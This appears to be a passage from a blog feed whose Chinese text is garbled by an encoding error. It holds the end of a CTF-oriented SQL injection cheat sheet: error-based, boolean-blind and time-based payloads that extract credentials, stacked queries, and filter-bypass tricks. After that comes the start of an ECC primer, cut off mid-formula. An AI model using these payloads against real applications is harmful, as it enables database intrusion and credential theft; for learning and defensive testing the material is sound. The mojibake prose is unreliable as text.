class="hljs-number">32</span>ä½å­—ç¬¦ï¼Œ æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨<span class="hljs-selector-tag">left</span>å’Œ<span class="hljs-selector-tag">right</span>å‡½æ•°åˆ†ä¸¤æ¬¡å°†<span class="hljs-selector-tag">flag</span>å·¦è¾¹çš„å†…å®¹å’Œå³è¾¹çš„å†…å®¹æ˜¾ç¤ºå‡ºæ¥ï¼Œé»˜è®¤ä»å·¦è¾¹å–ï¼Œ<br>å–å³è¾¹ï¼š<span class="hljs-selector-tag">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0</span>x7e,select <span class="hljs-built_in">group_concat</span>(<span class="hljs-built_in">right</span>(password,<span class="hljs-number">30</span>))from))<br></code></pre></td></tr></table></figure><h4 id="updatexml-æŠ¥é”™"><a class="markdownIt-Anchor" href="#updatexml-æŠ¥é”™"></a> updateXML æŠ¥é”™</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">updateXML</span> æŠ¥é”™<br>æ­£ç¡®å½¢å¼ï¼š<span class="hljs-selector-tag">updatexml</span>ï¼ˆ<span class="hljs-selector-tag">XML_document</span>,<span class="hljs-selector-tag">XPath_string</span>,<span class="hljs-selector-tag">new_value</span>ï¼‰<br>æŠ¥é”™æ³¨å…¥ï¼š <span class="hljs-selector-tag">and</span> <span class="hljs-selector-tag">updatexml</span>(<span class="hljs-number">1</span>,payload,<span class="hljs-number">1</span>) ä¾‹ï¼š<span class="hljs-selector-tag">updatexml</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0</span>x7e,(select <span class="hljs-variable">@@version</span>),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span> )<br>åœ¨<span class="hljs-selector-tag">ASCII</span>ç è¡¨ä¸­ï¼Œ<span class="hljs-number">0</span><span class="hljs-selector-tag">x7e</span>è¿™ä¸ªåå…­è¿›åˆ¶æ•°ä»£è¡¨ç¬¦å·~ï¼Œ~è¿™ä¸ªç¬¦å·åœ¨<span class="hljs-selector-tag">xpath</span>è¯­æ³•ä¸­æ˜¯ä¸å­˜åœ¨çš„ï¼Œå› æ­¤æ€»èƒ½æŠ¥é”™<br></code></pre></td></tr></table></figure><h3 id="ç›²æ³¨"><a class="markdownIt-Anchor" href="#ç›²æ³¨"></a> ç›²æ³¨</h3><p>ï¼ˆåªå›æ˜¾æ­£ç¡®é”™è¯¯æˆ–è€…ä¸ä¼šæŠ¥é”™å…·ä½“å†…å®¹ï¼‰</p><h4 id="å¸ƒå°”å‹æ³¨å…¥"><a class="markdownIt-Anchor" href="#å¸ƒå°”å‹æ³¨å…¥"></a> å¸ƒå°”å‹æ³¨å…¥</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=1â€™and 1=1 /and 1=2 å°è¯•åé¡µé¢æœ‰å˜åŒ– <br>ç¡®å®šæ•°æ®åº“é•¿åº¦ï¼š?Id=1â€™ and length((database()))=8 --+<br>ç¡®å®šæ•°æ®åº“åç§°ï¼š?id=1â€™ and ascii(substring(database(),1,1))=115--+<br>ç¡®å®šè¡¨çš„ä¸ªæ•°ï¼š?id=1â€™ and length(((select concat_ws(0x7e,table_name) from%20information_schema.tables where table_schema=database() limit 4,1)))&gt;1--+<br>ç¡®å®šæ¯ä¸ªè¡¨çš„é•¿åº¦ï¼š?id=1â€™ and length(((select concat_ws(0x7e,table_name) from information_schema.tables where table_schema=database() limit 0,1)))=6--+<br>ç¡®å®šæ¯ä¸ªè¡¨è¾¾åç§°ï¼š?id=1â€™ and ascii(substring((select concat_ws(0x7e,table_name) from information_schema.tables where table_schema=database() limit 0,1),1,1))=101--+<br>ç¡®å®šæ¯ä¸€åˆ—çš„é•¿åº¦ï¼š?id=1&#x27; and length(((select concat_ws(0x7e,column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1)))=2--+<br>ç¡®å®šæ¯ä¸€åˆ—çš„åç§°ï¼š?id=1&#x27; and ascii(substring((select concat_ws(0x7e,column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1)) =105--+<br>ç¡®å®šæ•°æ®ï¼š?id=1&#x27; and ascii(substring((select concat_ws(0x7e,username,password) from users limit 0,1),1,1)) =68--+<br></code></pre></td></tr></table></figure><h4 id="æ—¶é—´å»¶æ—¶æ³¨å…¥"><a class="markdownIt-Anchor" href="#æ—¶é—´å»¶æ—¶æ³¨å…¥"></a> æ—¶é—´å»¶æ—¶æ³¨å…¥</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mysql">æŠ¥é”™æ³¨å…¥ä¸å¸ƒå°”æ³¨å…¥æ—¶æ— ååº”ï¼Œå¯å°è¯•åŸºäºæ—¶é—´çš„æ³¨å…¥<br>sleep()å‚æ•°å†™æ•°å­—ï¼Œæ­¤å‡½æ•°ç”¨äºå°†æ—¶é—´å»¶è¿Ÿï¼Œå‚æ•°çš„å•ä½æ˜¯ç§’<br>if(expr1,expr2,expr3)è‹¥expr1ä¸ºçœŸåˆ™æ‰§è¡Œexpr2ï¼Œå¦åˆ™æ‰§è¡Œexpr3<br>æ ¹æ®çœŸå‡çš„ä¸åŒç½‘ç«™çš„è¿”å›æ—¶é—´è¿›è¡Œæ³¨å…¥ï¼Œ<br>?id=1 and sleep(10)--+<br>?id=1 &#x27;and sleep(10)--+<br>?id=1â€™ and if(ascii(left(database(),1))=115,sleep(5),1)--+<br>?id=1&#x27;and if(ascii(substring((select table_name from information_schema.tables where table_schema=&#x27;security&#x27;limit 0,1),1,1))&gt;0,sleep(2),1)--+<br>åé¢æ­¥éª¤åŒå¸ƒå°”ç›²æ³¨<br></code></pre></td></tr></table></figure><h3 id="å †å æ³¨å…¥"><a class="markdownIt-Anchor" href="#å †å æ³¨å…¥"></a> å †å æ³¨å…¥</h3><p>ï¼ˆselect è¢«è¿‡æ»¤æ—¶è€ƒè™‘ç”¨showï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mysql">Show databases;<br>Use æ•°æ®åº“åï¼›show tables;<br>Show columns from è¡¨å;<br>æ›´æ”¹è¡¨åï¼šalter table æ—§è¡¨å rename to æ–°è¡¨å         //åœ¨å¯å›æƒ³éƒ¨åˆ†è¡¨å†…å®¹æ—¶ï¼Œå¯ä»¥æŠŠè¦æ˜¾ç¤ºçš„è¡¨åä¿®æ”¹æˆè¦æœ‰æ˜¾ç¤ºçš„è¡¨å<br>æ›´æ”¹åˆ—åï¼šalter table è¡¨å change æ—§åˆ—å æ–°åˆ—å æ–°åˆ—åçš„æ•°æ®ç±»å‹<br> mysqlé™¤å¯ä½¿ç”¨selectæŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œä¹Ÿå¯ä½¿ç”¨handlerè¯­å¥ï¼Œè¿™æ¡è¯­å¥ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œä¸è¿‡handlerè¯­å¥å¹¶ä¸å…·å¤‡selectè¯­å¥çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒæ˜¯mysqlä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°SQLæ ‡å‡†ä¸­ã€‚<br>è¯­æ³•ï¼š//userså¤„ä¸ºè¡¨å<br>Handler users open;<br>Handler users read first;<br>Handler users read next;<br>Handler users close;<br></code></pre></td></tr></table></figure><h2 id="è¿›é˜¶"><a class="markdownIt-Anchor" href="#è¿›é˜¶"></a> è¿›é˜¶</h2><p>åº”å¯¹å„ç§è¿‡æ»¤æŠ€å·§</p><h3 id="è¿‡æ»¤ç©ºæ ¼"><a class="markdownIt-Anchor" href="#è¿‡æ»¤ç©ºæ ¼"></a> è¿‡æ»¤ç©ºæ ¼</h3><h4 id="æ³¨é‡Šç¬¦ç»•è¿‡"><a class="markdownIt-Anchor" href="#æ³¨é‡Šç¬¦ç»•è¿‡"></a> æ³¨é‡Šç¬¦/**/ç»•è¿‡</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT/**/name/**/FROM/**/table<br></code></pre></td></tr></table></figure><h4 id="ç”¨tabä»£æ›¿ç©ºæ ¼"><a class="markdownIt-Anchor" href="#ç”¨tabä»£æ›¿ç©ºæ ¼"></a> ç”¨Tabä»£æ›¿ç©ºæ ¼</h4><h4 id="20ç»•è¿‡"><a class="markdownIt-Anchor" href="#20ç»•è¿‡"></a> %20ç»•è¿‡</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT%20name%20FROM%20table<br></code></pre></td></tr></table></figure><h4 id="ä½¿ç”¨urlç¼–ç ç»•è¿‡"><a class="markdownIt-Anchor" href="#ä½¿ç”¨urlç¼–ç ç»•è¿‡"></a> ä½¿ç”¨<strong>urlç¼–ç </strong>ç»•è¿‡</h4><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">a0</span></span> å‘å‡ºå»å°±æ˜¯ç©ºæ ¼çš„æ„æ€ï¼Œä½†æ˜¯éœ€è¦åœ¨burpä¸­æŠ“åŒ…åä¿®æ”¹<br></code></pre></td></tr></table></figure><h4 id="ä½¿ç”¨å›è½¦æ›¿ä»£"><a class="markdownIt-Anchor" href="#ä½¿ç”¨å›è½¦æ›¿ä»£"></a> ä½¿ç”¨å›è½¦æ›¿ä»£</h4><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">å›è½¦çš„asciiä¸ºchr<span class="hljs-comment">(13)</span>&amp;chr<span class="hljs-comment">(10)</span>ï¼Œurlç¼–ç ä¸º<span class="hljs-meta">%</span><span class="hljs-number">0</span>d<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure><h4 id="åŒç©ºæ ¼"><a class="markdownIt-Anchor" href="#åŒç©ºæ ¼"></a> åŒç©ºæ ¼</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">é€‚ç”¨äºè¿‡æ»¤æ˜¯æ›¿æ¢ä¸€ä¸ªç©ºæ ¼<br></code></pre></td></tr></table></figure><h4 id="ç”¨æ‹¬å·ç»•è¿‡"><a class="markdownIt-Anchor" href="#ç”¨æ‹¬å·ç»•è¿‡"></a> ç”¨æ‹¬å·ç»•è¿‡</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select(user())from dual where(1=1)and(2=2)<br></code></pre></td></tr></table></figure><h3 id="è¿‡æ»¤å¼•å·"><a class="markdownIt-Anchor" href="#è¿‡æ»¤å¼•å·"></a> è¿‡æ»¤å¼•å·</h3><h4 id="27ä»£æ›¿å¼•å·"><a class="markdownIt-Anchor" href="#27ä»£æ›¿å¼•å·"></a> %27ä»£æ›¿å¼•å·</h4><h4 id="åå…­è¿›åˆ¶ç»•è¿‡"><a class="markdownIt-Anchor" href="#åå…­è¿›åˆ¶ç»•è¿‡"></a> åå…­è¿›åˆ¶ç»•è¿‡</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">åŸè¯­å¥ï¼šselect column_name  from information_schema.tables where table_name=0x7573657273   //hex(users)   åªèƒ½å¯¹å‚æ•°ä½¿ç”¨<br></code></pre></td></tr></table></figure><h4 id="asciiç ç»•è¿‡"><a class="markdownIt-Anchor" href="#asciiç ç»•è¿‡"></a> ASCIIç ç»•è¿‡</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)<br></code></pre></td></tr></table></figure><h3 id="è¿‡æ»¤ç­‰äºå·"><a class="markdownIt-Anchor" href="#è¿‡æ»¤ç­‰äºå·"></a> è¿‡æ»¤ç­‰äºå·</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ç”¨ like ä»£æ›¿ ï¼ša=<span class="hljs-selector-tag">b</span>  ---&gt;&gt;&gt; <span class="hljs-selector-tag">a</span> like <span class="hljs-selector-tag">b</span><br>regexp ä»£æ›¿ç­‰äºå·<span class="hljs-selector-tag">a</span> regexp b<br></code></pre></td></tr></table></figure><h3 id="è¿‡æ»¤é€—å·"><a class="markdownIt-Anchor" href="#è¿‡æ»¤é€—å·"></a> <strong>è¿‡æ»¤é€—å·</strong></h3><h4 id="ä½¿ç”¨fromå…³é”®å­—ç»•è¿‡"><a class="markdownIt-Anchor" href="#ä½¿ç”¨fromå…³é”®å­—ç»•è¿‡"></a> ä½¿ç”¨fromå…³é”®å­—ç»•è¿‡</h4><p>å¯¹äº<code>substr()</code>å’Œ<code>mid()</code>è¿™ä¸¤ä¸ªæ–¹æ³•å¯ä»¥ä½¿ç”¨<code>from to</code>çš„æ–¹å¼æ¥è§£å†³</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select substr(database() from 1 for 1);<br>select mid(database() from 1 for 1);<br></code></pre></td></tr></table></figure><h4 id="ä½¿ç”¨joinå…³é”®å­—ç»•è¿‡"><a class="markdownIt-Anchor" href="#ä½¿ç”¨joinå…³é”®å­—ç»•è¿‡"></a> ä½¿ç”¨<strong>joinå…³é”®å­—</strong>ç»•è¿‡</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">union select 1,2<br>ç­‰ä»·äº<br>union select * from (select 1)a join (select 2)b<br></code></pre></td></tr></table></figure><h4 id="ä½¿ç”¨offsetå…³é”®å­—ç»•è¿‡"><a class="markdownIt-Anchor" href="#ä½¿ç”¨offsetå…³é”®å­—ç»•è¿‡"></a> ä½¿ç”¨<strong>offsetå…³é”®å­—</strong>ç»•è¿‡</h4><p>å¯¹äºlimitå¯ä»¥ä½¿ç”¨offsetæ¥ç»•è¿‡ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from news limit 0,1<br>ç­‰ä»·äº<br>select * from news limit 1 offset 0<br></code></pre></td></tr></table></figure><h3 id="è¿‡æ»¤æ³¨é‡Šç¬¦å’Œ"><a class="markdownIt-Anchor" href="#è¿‡æ»¤æ³¨é‡Šç¬¦å’Œ"></a> è¿‡æ»¤æ³¨é‡Šç¬¦(#å’Œâ€“+)</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>ï¼‰æœ€åçš„or &#x27;<span class="hljs-number">1</span>é—­åˆæŸ¥è¯¢è¯­å¥çš„æœ€åçš„å•å¼•å·ï¼šid=<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>||&#x27;<span class="hljs-number">1</span><br><span class="hljs-attribute">2</span>ï¼‰%<span class="hljs-number">23</span>ç»•è¿‡<br></code></pre></td></tr></table></figure><h3 id="è¿‡æ»¤å…³é”®å­—"><a class="markdownIt-Anchor" href="#è¿‡æ»¤å…³é”®å­—"></a> è¿‡æ»¤å…³é”®å­—</h3><h4 id="åˆ†å‰²å…³é”®å­—"><a class="markdownIt-Anchor" href="#åˆ†å‰²å…³é”®å­—"></a> åˆ†å‰²å…³é”®å­—</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ç”¨<span class="hljs-regexp">/**/</span>ï¼Œ&lt;&gt; åˆ†å‰²ï¼šsel&lt;&gt;ectã€sel<span class="hljs-regexp">/**/</span>ect<br></code></pre></td></tr></table></figure><h4 id="ä½¿ç”¨åŠ å·æ‹†è§£å­—ç¬¦ä¸²"><a class="markdownIt-Anchor" href="#ä½¿ç”¨åŠ å·æ‹†è§£å­—ç¬¦ä¸²"></a> ä½¿ç”¨<strong>åŠ å·+æ‹†è§£å­—ç¬¦ä¸²</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">or â€˜swordsâ€™ =â€˜swâ€™ +â€™ ordsâ€™ ï¼›EXEC(â€˜INâ€™ +â€™ SERT INTO â€˜+â€™ â€¦..â€™ )<br></code></pre></td></tr></table></figure><h4 id="å¤§å°å†™ç»•è¿‡"><a class="markdownIt-Anchor" href="#å¤§å°å†™ç»•è¿‡"></a> å¤§å°å†™ç»•è¿‡</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">id=-1&#x27;UnIoN/**/SeLeCT<br></code></pre></td></tr></table></figure><h4 id="åŒå†™ç»•è¿‡"><a class="markdownIt-Anchor" href="#åŒå†™ç»•è¿‡"></a> åŒå†™ç»•è¿‡</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">é€‚ç”¨äºå‰¥ç¦»å…³é”®å­—çš„<br></code></pre></td></tr></table></figure><h4 id="ç¼–ç ç»•è¿‡"><a class="markdownIt-Anchor" href="#ç¼–ç ç»•è¿‡"></a> ç¼–ç ç»•è¿‡</h4><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-number">16</span>è¿›åˆ¶ç¼–ç ï¼Œurlç¼–ç ï¼Œ<span class="hljs-keyword">ascii</span>ç¼–ç (éƒ½åªå¯¹å‚æ•°æœ‰æ•ˆ)<br></code></pre></td></tr></table></figure><h3 id="è¿‡æ»¤è¿æ¥å…³é”®å­—"><a class="markdownIt-Anchor" href="#è¿‡æ»¤è¿æ¥å…³é”®å­—"></a> è¿‡æ»¤è¿æ¥å…³é”®å­—</h3><h4 id="è¿‡æ»¤concat"><a class="markdownIt-Anchor" href="#è¿‡æ»¤concat"></a> è¿‡æ»¤concat()</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">ä½¿ç”¨make_<span class="hljs-keyword">set</span>ï¼ˆï¼‰ä»£æ›¿<br></code></pre></td></tr></table></figure><img src="/2023/01/31/SQL%E6%B3%A8%E5%85%A5/2.jpg" class=""><p><a href="https://blog.csdn.net/weixin_46079186/article/details/120991059">make_set()ç”¨æ³•</a></p><h3 id="å‚è€ƒèµ„æ–™"><a class="markdownIt-Anchor" href="#å‚è€ƒèµ„æ–™"></a> <em>å‚è€ƒèµ„æ–™</em></h3><p><em><a href="https://ctf-wiki.org/web/sqli/">https://ctf-wiki.org/web/sqli/</a></em></p><p><em><a href="https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/">https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/</a></em></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ECC</title>
    <link href="/2023/01/29/ECC/"/>
    <url>/2023/01/29/ECC/</url>
    
    <content type="html"><![CDATA[<h3 id="eccåŸºç¡€"><a class="markdownIt-Anchor" href="#eccåŸºç¡€"></a> ECCåŸºç¡€</h3><p>ECC å…¨ç§°ä¸ºæ¤­åœ†æ›²çº¿åŠ å¯†ï¼ŒEllipseCurve Cryptographyï¼Œæ˜¯ä¸€ç§åŸºäºæ¤­åœ†æ›²çº¿æ•°å­¦çš„å…¬é’¥å¯†ç ã€‚ä¸ä¼ ç»Ÿçš„åŸºäºå¤§è´¨æ•°å› å­åˆ†è§£å›°éš¾æ€§çš„åŠ å¯†æ–¹æ³•ä¸åŒï¼ŒECC ä¾èµ–äºè§£å†³æ¤­åœ†æ›²çº¿ç¦»æ•£å¯¹æ•°é—®é¢˜çš„å›°éš¾æ€§ã€‚å®ƒçš„ä¼˜åŠ¿ä¸»è¦åœ¨äºç›¸å¯¹äºå…¶å®ƒæ–¹æ³•ï¼Œå®ƒå¯ä»¥åœ¨ä½¿ç”¨è¾ƒçŸ­å¯†é’¥é•¿åº¦çš„åŒæ—¶ä¿æŒç›¸åŒçš„å¯†ç å¼ºåº¦ã€‚ç›®å‰æ¤­åœ†æ›²çº¿ä¸»è¦é‡‡ç”¨çš„æœ‰é™åŸŸæœ‰</p><ul><li>ä»¥ç´ æ•°ä¸ºæ¨¡çš„æ•´æ•°åŸŸ GF(p)ï¼Œé€šå¸¸åœ¨é€šç”¨å¤„ç†å™¨ä¸Šæ›´ä¸ºæœ‰æ•ˆã€‚</li><li>ç‰¹å¾ä¸º 2 çš„ä¼½ç½—ååŸŸ GFï¼ˆ2^mï¼‰ï¼Œå¯ä»¥è®¾è®¡ä¸“é—¨çš„ç¡¬ä»¶ã€‚</li></ul><h4 id="æœ‰é™åŸŸä¸Šçš„æ¤­åœ†æ›²çº¿"><a class="markdownIt-Anchor" href="#æœ‰é™åŸŸä¸Šçš„æ¤­åœ†æ›²çº¿"></a> æœ‰é™åŸŸä¸Šçš„æ¤­åœ†æ›²çº¿</h4><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>y</mi><mn>2</mn></msup><mo>+</mo><mi>a</mi><mi>x</mi><mi>y</mi><mo>+</mo><mi>b</mi><mi>y</mi><mo>=</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>c</mi><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>d</mi><mi>x</mi><mo>+</mo><mi>e</mi></mrow><annotation encoding="application/x-tex">y^{2}+axy+by=x^{3}+cx^{2}+dx+e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0585479999999998em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">c</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">e</span></span></span></span></span></p><p>æ‰€ä»¥çš„ç³»æ•°éƒ½æ˜¯åœ¨æŸä¸ªæœ‰é™åŸŸ GF(p) ä¸­çš„å…ƒç´ ï¼Œå…¶ä¸­ p ä¸ºä¸€ä¸ªå¤§ç´ æ•°ã€‚</p><p>å¹¶ä¸æ˜¯æ‰€æœ‰çš„æ¤­åœ†æ›²çº¿éƒ½é€‚åˆäºåŠ å¯†ï¼Œæœ€ä¸ºå¸¸ç”¨çš„æ–¹ç¨‹å¦‚ä¸‹</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>y</mi><mn>2</mn></msup><mo>=</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>a</mi><mi>x</mi><mo>+</mo><mi>b</mi><mspace linebreak="newline"></mspace><mtext>å…¶ä¸­</mtext><mn>4</mn><msup><mi>a</mi><mn>3</mn></msup><mo>+</mo><mn>27</mn><msup><mi>b</mi><mn>2</mn></msup><mo mathvariant="normal">â‰ </mo><mn>0</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">y^{2}=x^{3}+ax+b\\å…¶ä¸­4a^{3}+27b^{2}\neq0(modp)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0585479999999998em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback">å…¶</span><span class="mord cjk_fallback">ä¸­</span><span class="mord">4</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 